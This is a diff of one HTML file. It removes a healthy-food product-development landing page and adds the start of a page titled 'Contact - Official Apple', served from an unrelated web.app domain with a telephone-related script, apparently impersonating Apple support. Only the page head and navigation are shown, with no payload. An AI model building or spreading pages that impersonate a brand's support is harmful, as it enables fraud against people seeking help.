@@ -1,1895 +1,372 @@
 
-
-<!DOCTYPE html> 
-
-<html>
-    <head>
-        <meta charset="UTF-8">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Greenfluenceenio -  Greenfluenceenio  Healthy Food Product Development Hub</title>
-        <meta property="og:title" content="Greenfluenceenio -  Greenfluenceenio  Healthy Food Product Development Hub" />
-        <meta property="og:image" content="posts/06-24-2026/Healthy-food-2026-06-19-2.jpg"/>
-        
-        <meta property="og:description" content="Introduction to Healthy Food and Beverage Product Development Greenfluenceenio provides product development services focused on healthy food." />
-        <meta name="description" content="Introduction to Healthy Food and Beverage Product Development Greenfluenceenio provides product development services focused on healthy food." />
-        
-        <link rel="shortcut icon" href="brand.svg" type="image/x-icon">
-        <link href="https://fonts.googleapis.com/css2?family=Play:wght@400;700&display=swap" rel="stylesheet">
-        <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@200..700&display=swap" rel="stylesheet" />
-
-        
-        
-
-        <style>
-            body{
-
-                font-family: 'Play', sans-serif !important;
-                direction: ltr;
-                font-size: 1em;
-                margin: 0;
-            }
-
-            *, *::before, *::after {
-                box-sizing: border-box;
-            }
-
-            :root {
-                --blob-radius-1: 64% 36% 49% 51% / 52% 41% 59% 48%;
-                --blob-radius-2: 72% 28% 34% 66% / 60% 44% 56% 40%;
-                --blob-radius-3: 58% 42% 68% 32% / 38% 72% 28% 62%;
-                --blob-radius-4: 81% 19% 41% 59% / 66% 54% 46% 34%;
-                --blob-radius-5: 45% 55% 70% 30% / 25% 65% 35% 75%;
-            }
-
-
-
-            .space-frame {
-                max-width: 1200px;
-                padding-right: 18px;
-                padding-left: 18px;
-                margin-right: auto;
-                margin-left: auto;
-            }
-
-            .value-blink-section {
-                direction: initial;
-                width: 100%;
-                overflow: hidden;
-                background: #EF2143;
-                padding: 9px 0;
-                position: relative;
-            }
-
-            .value-blink-track {
-                display: flex;
-                width: fit-content;
-                animation: scroll-left 25s linear infinite;
-            }
-
-            .value-blink-content {
-                display: flex;
-            }
-
-            .value-blink {
-                margin: 0 40px;
-                font-size:  17px;
-                font-weight: 700;
-                color: #000;
-                white-space: nowrap;
-            }
-
-            @keyframes scroll-left {
-                0% {
-                    transform: translateX(0%);
-                }
-                100% {
-                    transform: translateX(-50%);
-                }
-            }
-
-            .first-impress-sect {
-                overflow: hidden;
-            }
-
-            .first-impress-heder {
-                padding-top: 15px;
-                padding-bottom: 15px;
-                background-color: #f0e4d7;
-            }
-
-            .fih-flex, .fih-logo, .fih-nav {
-                display: flex;
-                flex-direction: row;
-                align-items: center;
-                flex-wrap: wrap;
-                gap: 9px;
-                text-decoration: none;
-                
-            }
-
-            .fih-flex {
-                justify-content: space-between;
-                padding-left: 18px;
-                padding-right: 18px;
-                width: 100%;
-            }
-
-            .fih-logo img {
-                width: 60px;
-                height: 60px;
-            }
-
-            .fih-logo h2 {
-                font-size: 20px;
-                font-weight: 700;
-                color: #000;
-                margin: 0;
-            }
-
-            .fih-nav a, .ezs-nav a {
-                font-size: 17px;
-                color: #000;
-                z-index: 10;
-                position: relative;
-                letter-spacing: 1px;
-                text-decoration: none;
-                width: fit-content;
-            }
-
-            .fih-nav a:hover, .ezs-nav a:hover {
-                color: #0A043C;
-            }            
-
-            .fih-nav a:after, .ezs-nav a:after {
-                content: '';
-                width: 0;
-                height: 1px;
-                background: #0A043C;
-                display: block;
-                margin: 1px 0 0 0;
-                line-height: 1px;
-                transition: all 0.3s ease 0s;
-            }
-
-            .fih-nav a:hover::after, .ezs-nav a:hover::after {
-                width: 100%;
-            }
-
-            .first-impress-banner {
-                overflow: hidden;
-                padding-top: 50px;
-                padding-bottom: 50px;
-                position: relative;
-                z-index: 0;
-                display: flex;
-                flex-direction: row;
-                justify-content: center;
-                align-items: center;
-            }
-
-            .fib-bg {
-                position: absolute;
-                z-index: -1;
-                width: 100%;
-                height: 100%;
-                background-image: url('pics/hero-bg-1920x10800.jpg');
-                animation: kenburns-bottom 5s ease-out both infinite;
-                background-position: center;
-                background-size: cover;
-                background-repeat: no-repeat;
-            }
-
-            @keyframes kenburns-bottom {
-                0% {
-                    transform: scale(1) translateY(0);
-                    transform-origin: 50% 84%;
-                }
-                100% {
-                    transform: scale(1.25) translateY(18px);
-                    transform-origin: bottom;
-                }
-            }
-
-            .fib-cloud {
-                width: fit-content;
-                height: fit-content;
-                max-width: 40%;
-                padding: 56px;
-                box-shadow: 0 8px 18px rgba(251, 230, 230, 0.6), 0 4px 12px rgba(0, 0, 0, 0.08);                
-                border-radius: var(--blob-radius-5);
-                display: flex;
-                flex-direction: column;
-                justify-content: center;
-                align-items: center;
-                text-align: center;
-                color: #333;
-                opacity: 0.9;
-                transition: box-shadow 0.4s ease;
-                background: radial-gradient(circle at 50% 50%, #ffffff 0%, #EF2143 120%);
-            } 
-
-            .fib-name {
-                font-size: 20px;
-                font-weight: 700;
-                letter-spacing: 0px;
-                text-transform: uppercase;
-                margin: 0;
-                margin-bottom: 9px;
-            }
-
-            .fib-txt {
-                font-size: 15px;
-                letter-spacing: 1px;
-                text-transform: lowercase;
-                margin: 0;
-                margin-bottom: 18px;
-            }
-            
-            .fib-title {
-                font-size: 20px;
-                margin: 0;
-                font-weight: 700;
-                text-align: center;
-                width: 80%;
-            }
-
-            .fib-name, .fib-title, .fib-txt {
-                animation: text-focus-in 2s cubic-bezier(0.550, 0.085, 0.680, 0.530) both;
-            }
-
-            @keyframes text-focus-in {
-                0% {
-                    -webkit-filter: blur(15px);
-                            filter: blur(15px);
-                    opacity: 0;
-                }
-                100% {
-                    -webkit-filter: blur(0px);
-                            filter: blur(0px);
-                    opacity: 1;
-                }
-            }
-
-            .brand-story-section {
-                padding-top: 50px;
-                padding-bottom: 50px;
-                background-color: #f0e4d7;
-            }
-
-            .brand-story-title {
-                font-size: 46px;
-                font-weight: 700;
-                text-align: center;
-                margin: 0;
-                margin-bottom: 27px;
-            }
-
-            .brand-story-flexbox {
-                display: flex;
-                flex-direction: row-reverse;
-                gap: 34px;
-                justify-content: center;
-                align-items: center;
-            }
-
-            .brand-story-flexcol {
-                width: 28%;
-                display: flex;
-                flex-direction: column;
-                gap:  21px;
-                align-items: center;
-            }
-
-            .brand-benefits {
-                display: none;
-            }
-
-            .bsf-img {
-                width: 80%;
-                position: relative;
-            }
-
-            .bsf-img img {
-                width: 100%;
-                height: 271px;
-                object-fit: cover; 
-                z-index: 1;
-                position: relative; 
-                border-radius: var(--blob-radius-2);
-            }
-
-            .brand-story-flexcol:nth-child(2) {
-                width: 48%;
-            }
-
-            .brand-story-flexcol:nth-child(2) .bsf-img {
-                width: 100%;
-            }
-
-            .brand-story-flexcol:nth-child(2) .bsf-img img {
-                border-radius: var(--blob-radius-5);
-            }
-
-            .bsf-img::before {
-                content: "";
-                width: 123px;
-                height: 123px;
-                background: #EF2143;
-                border-radius: var(--blob-radius-5);
-                position: absolute;
-                left: 0;
-                top: 15px;
-            }
-
-            .bsf-img::after {
-                content: "";
-                width: 123px;
-                height: 123px;
-                background: #EF2143;
-                border-radius: var(--blob-radius-5);
-                position: absolute;
-                right: 0;
-                left: auto;
-                bottom: 15px;
-            }
-
-
-            .bsf-txt {
-                font-size: 15px;
-                line-height: 1.5;
-            }
-
-            .brand-story-flexcol:nth-child(2) .bsf-img::before {
-                content: "";
-                width: 249px;
-                height: 123px;
-                background: #EF2143;
-                border-radius: var(--blob-radius-5);
-                position: absolute;
-                left: auto;
-                right: 0;
-                top: 0px;
-            } 
-
-            .brand-story-flexcol:nth-child(2) .bsf-img::after {
-                content: "";
-                width: 249px;
-                height: 123px;
-                background: #EF2143;
-                border-radius: var(--blob-radius-5);
-                position: absolute;
-                left: 0;
-                bottom: 0px;
-            } 
-
-            .bsf-txt span {
-                color: #EF2143;
-            }
-
-            .brand-story-flexcol:nth-child(2) .bsf-txt {
-                font-size: 17px;
-            }
-
-            .product-display-bg {
-                background-image: url('pics/hero-bg-1920x10801.jpg');
-                background-position: center;
-                background-repeat: no-repeat;
-                background-size: cover;
-                position: relative;  
-                z-index: 0;  
-            }
-
-            .product-display-bgfilter {
-                position: absolute;
-                inset: 0;
-                backdrop-filter: blur(18px);
-                -webkit-backdrop-filter: blur(18px); 
-                background-color: rgba(255, 255, 255, 0.3); 
-                z-index: 1;
-            }
-
-            .space-frame.product-display {
-                position: relative;
-                z-index: 2;
-                padding: 27px;
-                color: #000; 
-            }
-
-            .product-display-title {
-                font-size: 46px;
-                font-weight: 700;
-                letter-spacing: 1px;
-                margin: 0;
-                margin-bottom: 56px;
-                text-align: center;
-                color: #000;
-            }
-
-            .prds-media {
-                width: 50%;
-                float: right;
-                margin: 0 18px 18px;
-                display: flex;
-                flex-direction: column;
-                gap: 21px;
-            }
-
-            .prds-img {
-                width: 100%;
-                height: 343px;  
-                box-shadow: 0 8px 20px rgba(251, 230, 230, 0.6), 0 4px 12px rgba(0, 0, 0, 0.08);                
-                border-radius: 20px;      
-                padding: 27px;
-                background: radial-gradient(circle at 50% 50%, #ffffff84 0%, #EF214384 120%);
-            }
-
-            .prds-img img {
-                width: 100%;
-                height: 100%;
-                object-fit: contain;
-            }
-
-            .prds-info {
-                display: flex;
-                flex-direction: column;
-                gap: 27px;
-            }
-            
-            .prds-price-box {
-                display: flex;
-                gap: 18px;
-                align-items: center;
-                justify-content: center;
-            }
-
-            .old-price {
-                font-size: 17px;
-                color: #434343;
-                padding: 18px  9px;
-                border-radius: 20px;
-                border: 1px solid #434343;
-                text-decoration: line-through;
-                opacity: 1;
-                animation: fadeCycle 7s ease-in-out infinite;
-            }
-
-            .new-price {
-                font-size: 20px;
-                color: #fff;
-                padding: 18px  9px;
-                border-radius: 20px;
-                font-weight: 700;
-                animation: popIn 1s ease-in-out 2s forwards;
-                opacity: 0;
-                transform: scale(0.8);
-                box-shadow: 0 8px 20px rgba(251, 230, 230, 0.6), 0 4px 12px rgba(0, 0, 0, 0.08);                
-                background: radial-gradient(circle at 50% 50%, #ffffff84 0%, #EF214384 120%);
-            }
-
-            @keyframes fadeCycle {
-                0% { opacity: 1; transform: translateY(0); }
-                42% { opacity: 1; }       
-                60% { opacity: 0; transform: translateY(-10px); }
-                100% { opacity: 0; transform: translateY(-10px); }
-            }
-
-            @keyframes popIn {
-                to {
-                opacity: 1;
-                transform: scale(1);
-                }
-            }
-
-            .prds-prod-view, .prds-prod-aviable, .prds-prod-code {
-                font-size: 15px;
-                font-weight: 700;
-                display: flex;
-                gap: 9px;
-                align-items: center;
-                color: #fff;
-                width: fit-content;
-                padding: 9px 40px;
-                border-radius: 20px;
-                box-shadow: 0 8px 20px rgba(251, 230, 230, 0.6), 0 4px 12px rgba(0, 0, 0, 0.08);                
-                background: radial-gradient(circle at 50% 50%, #ffffff84 0%, #EF214384 120%);   
-            }
-
-            .prds-prod-aviable, .prds-prod-code {
-                margin-left: auto;
-            }
-
-            .prds-prod-view svg, .prds-prod-aviable svg, .prds-prod-code svg {
-                fill: #fff;
-                width: 31pxpx;
-                height: 31pxpx;
-            }
-
-            .prds-btn {
-                display: flex;
-                justify-content: center;
-            }
-
-            .prds-pay-box {
-                display: flex;
-                flex-direction: row;
-                gap: 21px;
-                align-items: center;
-                justify-content: center;
-            }
-
-            .prds-pay-box img {
-                width: 123px;
-                height: auto;
-                object-fit: contain;
-            }
-
-            .prds-prod-desc {
-                font-size: 15px;
-                font-weight: 700;
-                text-transform: uppercase;
-                margin: 0;
-                margin-bottom:  18px;
-            }
-
-            .prds-txt {
-                font-size: 15px;
-                line-height: 1.5;
-                color: #000;
-                margin-bottom:  18px;
-            }
-
-            .prds-glass-form {
-                width: 80%;
-                align-items: center;
-                display: flex;
-                flex-wrap: wrap;
-                gap: 27px;
-                justify-content: center;
-                margin: 27px auto;
-                gap: 15px;
-                padding: 27px;
-                border-radius: 20px;
-                background: radial-gradient(circle at 50% 50%, #ffffff26 0%, #EF214351 120%);
-                backdrop-filter: blur(10px);
-                -webkit-backdrop-filter: blur(10px);
-                border: 1px solid rgba(255,255,255,0.25);
-                box-shadow: 0 8px 32px rgba(0,0,0,0.1);
-                color: white;
-            }
-
-            .prds-glass-form > * {
-                flex: 1 1 45%;
-                min-width: 220px;
-            }
-
-            .prds-glass-form label {
-                font-weight: 700;
-                color: white;
-            }
-
-            .input-group__group_input {
-                padding: 9px 15px;
-                border: 1px solid rgba(255,255,255,0.3);
-                border-radius: 8px;
-                background: rgba(255,255,255,0.1);
-                color: #000;
-                font-size: 17px;
-                backdrop-filter: blur(4px);
-                transition: border-color 0.3s ease;
-            }
-
-            .input-group__group_input::placeholder {
-                color: rgba(255,255,255,0.7);
-            }
-
-            .input-group__group_input:focus {
-                border-color: #EF2143;
-                outline: none;
-            }
- 
-            .textarea-group__group_input {
-                padding: 9px 15px;
-                border: 1px solid rgba(255,255,255,0.3);
-                border-radius: 8px;
-                background: rgba(255,255,255,0.1);
-                color: #000;
-                font-size: 17px;
-                backdrop-filter: blur(4px);
-                transition: border-color 0.3s ease;
-            }
-
-            .textarea-group__group_input::placeholder {
-                color: rgba(255,255,255,0.7);
-            }
-
-            .textarea-group__group_input:focus {
-                border-color: #EF2143;
-                outline: none;
-            }
-
-            .glass-form .pg-form-check,
-            .glass-form button,
-            .glass-form .btn-style {
-                flex-basis: 100%;
-                min-width: 0;
-                margin: auto;
-                display: flex;
-                justify-content: center;
-            }
-
-            .pg-form-check {
-                display: flex;
-                align-items: center;
-                gap: 9px;
-                color: white;
-            }
-
-            .pg-form-check input {
-                width: 31pxpx;
-                height: 31pxpx;
-                accent-color: #EF2143;
-            }
-              .pg-form-check textarea {
-                width: 31pxpx;
-                height: 31pxpx;
-                accent-color: #EF2143;
-            }
-            .pg-form-check label {
-                font-size: 17px;
-                color: white;
-            }
-
-            .pg-form-check label a {
-                color: white;
-                text-decoration: underline;
-            }
-
-            .pg-form-check label a:hover {
-                color: #EF2143;
-            }
- 
-
-            .real-rewiews-section {
-                padding: 50px 0;
-                background-color: #f0e4d7;
-            }
-
-            .real-rewiews-title {
-                font-size: 46px;
-                font-weight: 700;
-                text-align: center;
-                margin: 0;
-                margin-bottom: 34px;
-            } 
-            
-            .real-rewiews-flexbox {
-                display: flex;
-                flex-direction: row;
-                gap: 34px;
-                justify-content: center;
-                align-items: center;
-                flex-wrap: wrap;
-            }
-
-            .real-rewiews-media {
-                width: 45%;
-                float: left;
-                display: block;
-                border-radius: 20px;
-                background-image: url('pics/icon-DPr-0.jpg');
-                background-size: cover;
-                background-position: center;
-                background-repeat: no-repeat;
-            }
-
-            .real-rewiews-img:nth-child(1) {
-                width: 45%;
-                height: 220px;
-                object-fit: cover;
-                margin-top: -18px;
-                margin-left: -18px;
-                margin-right: auto;  
-                background-color: #f0e4d7;
-                border-right: 18px solid #f0e4d7;        
-                border-bottom: 18px solid #f0e4d7;
-                border-radius: 20px 20px 20px 20px;  
-            }
-
-            .real-rewiews-img:nth-child(2) {
-                width: 45%;
-                height: 220px;
-                object-fit: cover;
-                border-radius: 20px;
-                margin-left: auto;  
-                margin-bottom: -18px;
-                margin-right: -18px;
-                background-color: #f0e4d7;  
-                border-left: 18px solid #f0e4d7;  
-                border-top: 18px solid #f0e4d7;    
-                border-radius: 20px 20px 20px 20px;       
-            }
-
-            .real-rewiews-img img {
-                width: 100%;
-                height: 100%;
-                object-fit: cover;
-                border-radius: 15px;
-            }
-
-            .real-rewiews-list {
-                width: 45%;
-                float: left;
-                display: flex;
-                flex-direction: column;
-                gap: 34px;
-            }
-
-            .real-rewiews-item {
-                display: flex;
-                flex-direction: column;
-                gap: 18px;
-                position: relative;
-                background-color: #ffffff;
-                padding: 21px 18px;
-                border-radius: 25px;
-            }
-
-            .real-rewiews-item::before {
-                content: "";
-                position: absolute;
-                top: - 56px;
-                left: 0;
-                height: 80px;
-                width: 70px;
-                transform: rotate(180deg);
-                background: #ffffff;
-                clip-path: path("M0 0H79.9695V76.3123C80.0103 77.5714 80.0101 78.8022 79.9695 80V76.3123C79.0054 46.5602 55.1443 0.959397 0 0Z");
-            }
-
-            .rri-rating {
-                display: flex;
-                gap: 5px;
-                justify-content: center;
-                align-items: center;
-                font-size: 40px;
-                font-weight: 700;
-                color: #EF2143;
-            }
-
-            .rri-rating svg {
-                width: 45px;
-                height: 45px;
-                fill: #EF2143;
-            }
-
-            .rri-comment {
-                font-size: 15px;
-                font-style: italic;
-                line-height: 1.5;
-                text-align: center;
-                color: #000;
-            }
-
-            .rri-author {
-                display: flex;
-                flex-direction: row-reverse;
-                justify-content: space-between;
-                align-items: center;
-                gap: 15px;
-            }
-
-            .rri-author img {
-                width: 60px;
-                height: 60px;;
-                border-radius: 100%;
-                object-fit: cover;
-            }
-
-            .rri-name {
-                font-size: 20px;
-                font-weight: 700;
-            }
-
-            .rri-author svg {
-                width: 45px;
-                height: 45px;
-                fill: #EF2143;
-            }
-
-            .purchase-map-bg {
-                position: relative;
-                z-index: 0;
-                background-color: #EF2143;
-                padding: 50px 0;
-            }
-
-            .purchase-map-bg img {
-                position: absolute;
-                top: 10%;
-                left: 3%;
-                z-index: 1;
-                width: fit-content;
-                height: 300px;
-                object-fit: contain;
-            }
-
-            .purchase-map-title {
-                font-size: 46px;
-                font-weight: 700;
-                text-align: center;
-                margin: 0;
-                margin-bottom: 40px;
-                color: #000;
-            }
-
-            .purchase-map-list {
-                display: flex;
-                flex-direction: row;
-                justify-content: center;
-                align-items: center;
-                gap: 27px;
-            }
-
-            .purchase-map-item {
-                width: 30%;
-                padding: 27px 18px;
-                border-radius: 20px;
-                display: flex;
-                flex-direction: column;
-                gap: 18px;
-            }
-
-            .purchase-map-item:hover {
-                background-color: #4343437f;
-                box-shadow: 0 8px 20px rgba(251, 230, 230, 0.6), 0 4px 12px rgba(0, 0, 0, 0.08);                
-            }
-
-            .pm-inner {
-                display: flex;
-                flex-direction: row;
-                gap: 9px;
-                align-items: center;
-                justify-content: space-between;
-            }
-
-            .pm-num span {
-                font-size: 28px;
-                font-weight: 700;
-                color: #00000080;
-            }
-
-            .pm-arrow {
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                gap: 9px;
-            }
-
-            .pm-arrow svg {
-                width: 31pxpx;
-                height: 31pxpx;
-                fill: #000;
-            }
-
-            .pm-icon {
-                width: 60px;
-                height: 60px;
-                fill: #000;
-                border-radius: 50%;
-                border: 1px solid #000;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-            }
-
-            .pm-icon svg {
-                width: 45px;
-                height: 45px;
-            }
-
-            .pm-title {
-                font-size: 20px;
-                font-weight: 700;
-                color: #000;
-                margin: 0;
-            }
-
-            .pm-txt {
-                font-size: 15px;
-                color: #000;
-                margin: 0;
-                margin-top: 9px;
-            }
-
-            .purchase-map-item:hover .pm-title {
-                color: #EF2143;
-            }
-
-            .need-to-know-sect {
-                padding: 50px 0;
-                background-color: #f0e4d7;
-            }
-
-            .need-to-know-flexbox {
-                display: flex;
-                flex-direction: column;
-                justify-content: center;
-                align-items: center;
-                gap: 34px;
-            }
-
-            .ntk-worktime {
-                width: 45%;
-                height: 617px;
-                position: relative;
-                z-index: 0;
-            }
-            
-            .ntk-worktime-img {
-                width: 100%;
-                height: 100%;
-                position: absolute;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                z-index: 1;
-                border-radius: var(--blob-radius-1);
-            }       
-            .ntk-worktime-img-img {
-                width: 100%;
-                height: 100%;
-                object-fit: cover;
-                border-radius: var(--blob-radius-1);
-            }
-
-            .ntk-worktime-txt {
-                padding: 40px;
-                background-color: #EF2143;
-                border-radius: var(--blob-radius-5);
-                position: absolute; 
-                bottom: -40px;
-                left: auto;
-                right: -40px;
-                z-index: 3;
-            }
-
-            .ntk-worktime-txt h4 {
-                font-size: 28px;
-                font-weight: 700;
-                color: #fff;
-                margin: 0;
-                margin-bottom: 18px;
-            }
-            .ntk-worktime-txt p {
-                font-size: 17px;
-                color: #fff;
-                margin: 0;
-                line-height: 1.5;
-            }
-
-            .ntk-content {
-                width: 48%;
-            }
-
-            .ntk-content h2 {
-                font-size: 28px;
-                font-weight: 700;
-                color: #000;
-                margin: 0;
-                margin-bottom: 34px;
-            }
-
-           .ntk-faq-accordion {
-            margin: 35px auto;
-                border-radius: 20px;
-                background: #fff;
-                box-shadow: 0 4px 24px rgba(0,0,0,0.08);
-                padding: 18px;
-            max-width: 800px;
-        }
-            
-        .ntk-faq-item {
-           margin-bottom: 15px;
-                border-bottom: 1px solid #eee;
-                padding-bottom: 9px;
-        }
-        
-        .ntk-faq-item input[type="checkbox"] {
-            display: none;
-        }
-            
-        .ntk-faq-question {
-           display: block;
-                font-weight: 700;
-                font-size: 17px;
-                cursor: pointer;
-                padding: 15px 0;
-            color: #333;
-            transition: color 0.3s ease;
-            position: relative;
-            
-            padding-right: 30px;
-        }
-
-        
-        .ntk-faq-question::after {
-            content: '▼';
-            position: absolute;
-            right: 0;
-            top: 50%;
-            transform: translateY(-50%);
-            transition: transform 0.3s ease;
-            font-size: 14px;
-            color: #666;
-        }
-            
-        .ntk-faq-item input[type="checkbox"]:checked + .ntk-faq-question {
-            color: #EF2143;
-        }
-
-        .ntk-faq-item input[type="checkbox"]:checked + .ntk-faq-question::after {
-            transform: translateY(-50%) rotate(180deg);
-            color: #EF2143;
-        }
-            
-      
-        .ntk-faq-answer {
-            max-height: 0;
-            overflow: hidden;
-           
-            transition: max-height 0.4s cubic-bezier(0.4, 0, 0.2, 1),
-                       padding 0.4s cubic-bezier(0.4, 0, 0.2, 1),
-                       opacity 0.3s ease;
-            font-size: {font-size-normal};
-            color: #444;
-              padding-left: 9px;
-            opacity: 0;
-            line-height: 1.6;
-        }
-        
-        .ntk-faq-item input[type="checkbox"]:checked ~ .ntk-faq-answer {
-           
-            max-height: 500px;
-            padding:  9px 0 9px 9px;
-            opacity: 1;
-        }
-
-  
-        .ntk-faq-question:hover {
-            color: #EF2143;
-        }
-
-        .ntk-faq-question:hover::after {
-            color: #EF2143;
-        }
-
-      
-        .ntk-faq-answer p {
-            margin: 0 0 12px 0;
-        }
-
-        .ntk-faq-answer p:last-child {
-            margin-bottom: 0;
-        }
-
-            .endzone-section-bg {
-                background-color: #EF2143;
-            }
-
-            .endzone-section-bgoverlay {
-                background-image: url('pics/light-overlay-1600x9000.png');
-                background-position: center;
-                background-repeat: no-repeat;
-                background-size: cover;
-                padding: 50px 0 40px 0;
-            }
-
-            .endzone-section {
-                display: flex;
-                flex-direction: row-reverse;
-                align-items: center;
-                justify-content: center;
-                gap: 40px;
-            }
-
-            .ezs-flexcol {
-                width: 32%;
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-                gap: 27px;
-            }
-
-            .ezs-nav-title {
-                font-size: 20px;
-                font-weight: 700;
-                color: #000;
-                margin: 0;
-            }
-
-            .ezs-logo-box {
-                flex-direction: column;
-                align-items: center;
-            }
-
-            .ezs-logo {
-                display: flex;
-                flex-direction: row;
-                align-items: center;
-                gap: 9px;
-                text-decoration: none;
-            }
-
-            .ezs-logo img {
-                width: 45px;
-                height: 45px;
-            }       
-
-            .ezs-logo h2 {
-                font-size: 20px;
-                font-weight: 700;
-                color: #000;
-                margin: 0;
-            }
-            
-            .ezs-trust-client-title {
-                font-size: 20px;
-                font-weight: 700;
-                color: #000;
-                margin: 0;
-                margin-bottom: 18px;
-                text-align: center;
-            }
-
-            .ezs-trust-client-txt {
-                font-size: 15px;
-                color: #000;
-                margin: 18px 0;
-                text-align: center;
-            }
-
-            .ezs-contact-list {
-                gap: 15px;
-                flex-direction: column;
-            }
-            
-            .ezs-contact-item {
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-                gap: 9px;
-                color: #000;
-            }
-            .ezs-contact-item h4 {
-                text-align: center;
-                font-size: 17px;
-                font-weight: 700;
-                margin: 0;
-                word-break: break-all;
-            }   
-
-            .ezs-contact-item p, .ezs-contact-item a {
-                text-align: center;
-                font-size: 15px;
-                color: #000;
-                margin: 0;
-                text-decoration: none;
-                word-break: break-all;
-            }
-            .ezs-contact-item a:hover {
-                text-decoration: underline;
-            }
-
-            .prod-policy {
-                padding: 50px 0;
-                overflow: hidden;
-                word-break: break-all;
-            }
-
-
-        
-
-
-            .btn-style {
-                padding: 15px 30px;
-                border: none;
-                font-weight: 700;
-                font-size: 17px;
-                cursor: pointer;
-                transition: all 0.3s ease;
-            }
-
-            .button-1 {
-                background: black;
-                color:  #ffffff;
-                border-radius: 5px;
-            }
-
-            .button-1:hover {
-                background:  #ffffff;
-                color: black;
-                border: 2px solid black;
-            }
-
-            .button-2 {
-                background:  #ffffff;
-                color: black;
-                border: 1px solid #ccc;
-                border-radius: 15px;
-                text-transform: uppercase;
-                box-shadow: 2px 2px 6px rgba(0,0,0,0.1);
-            }
-
-            .button-2:hover {
-                transform: translateY(-2px);
-                box-shadow: 2px 4px 10px rgba(0,0,0,0.2);
-            }
-
-            .button-3 {
-                background: #EF2143;
-                color:  #ffffff;
-            }
-
-            .button-3:hover {
-                background: #EF2143cf;
-            }
-
-            .button-4 {
-                background: #f1f1f1;
-                color: black;
-                border-radius: 50px;
-            }
-
-            .button-4:hover {
-                background: #EF2143;
-                color:  #ffffff;
-                text-transform: uppercase;
-            }
-
-            .button-5 {
-                background: #EF2143;
-                color:  #ffffff;
-                transform: scale(1);
-                border-radius: 6px;
-            }
-
-            .button-5:hover {
-                transform: scale(1.05);
-            }
-
-@media (max-width: 1650px) {
-
-    .purchase-map-bg img {
-        top: -15%;
-        height: 220px;
-    }
-
-}
-
-@media (max-width: 1200px) {
-
-    .grid-shell {
-        max-width: 1140px;
-    }
-
-}
-
-@media (max-width: 992px) {
-
-    .fih-flex, .fih-logo, .fih-nav {
-        justify-content: center;
-        align-items: center;
-    }
-    .fih-flex {
-        justify-content: center !important;
-    }
-    .grid-shell {
-        max-width: 960px;
-    }
-
-    .fib-cloud {
-        width: 65%;
-        max-width: 65%;
-    }
-
-}
-
-@media(max-width: 767px)  {
-
-    .grid-shell {
-        max-width: 720px;
-    }
-
-    .fih-flex {
-        flex-wrap: wrap;
-    }
-
-    .fib-cloud {
-        width: 95%;
-        max-width: 95%;
-    }
-
-    .brand-benefits {
-        display: none;
-    }
-
-    .prds-media {
-        float: none;
-        flex-direction: column;
-        width: 100%;
-        margin: 0 0 20px 0;
-    }
-
-    .brand-story {
-        flex-direction: column !important;
-    }
-
-    .prds-glass-form {
-        width: 100%;
-        margin: 0;
-    }
-
-    .purchase-map-list {
-        flex-direction: column;
-    }
-
-    .real-rewiews-media {
-        display: none;
-    }
-
-    .real-rewiews-list {
-        flex-direction: column !important;
-    }
-
-    .purchase-map-item {
-        width: 100%;
-        background-color: #4343437f;
-        box-shadow: 0 8px 20px rgba(251, 230, 230, 0.6), 0 4px 12px rgba(0, 0, 0, 0.08);
-    }
-
-    .purchase-map-bg img {
-        display: none;
-    }
-
-    .need-to-know-flexbox {
-        flex-direction: column !important;
-    }
-
-    .ntk-worktime-txt {
-        width: 85%;
-    }
-
-    .endzone-section {
-        flex-direction: column;
-    }
-
-    .ezs-flexcol {
-        width: 100%;
-    }
-
-
-
-
-
-}
-
-@media(max-width: 576px) {
-
-    .grid-shell {
-        max-width: 540px;
-    }
-
-    .fib-cloud {
-        max-width: 99%;
-        width: 99%;
-        border-radius: 30px;
-        padding: 25px;
-    }
-
-    .fih-nav a {
-        font-size: 14px;
-    }
-
-}
-
- 
-        </style>
-            
-        </head>
-
-        <body>
-            
-            
-
-            <header>
-                <section class="value-blink-section">
-                    <div class="value-blink-track">
-                        <div class="value-blink-content" id="vlblContent">
-                            <span class="value-blink">Greenfluenceenio</span>
-                            <span class="value-blink">Greenfluenceenio</span>
-                            <span class="value-blink">Greenfluenceenio</span>
-                            <span class="value-blink">Greenfluenceenio</span>
-                            <span class="value-blink">Greenfluenceenio</span>
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
+<head>
+
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-gEEMqUnZieFLmujeur40B.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
